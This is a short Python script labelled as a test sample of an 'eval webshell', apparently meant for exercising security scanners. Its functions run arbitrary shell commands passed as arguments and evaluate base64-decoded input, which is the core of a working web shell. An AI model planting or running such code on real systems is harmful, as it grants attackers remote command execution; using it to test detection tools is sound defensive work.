#!/usr/bin/env python3
"""[TEST SAMPLE] Python eval webshell - FOR SECURITY TESTING ONLY"""
import os
import subprocess
import base64

def execute_command(cmd):
    return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)

def eval_payload(payload):
    return eval(base64.b64decode(payload))

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        print(execute_command(sys.argv[1]).decode())
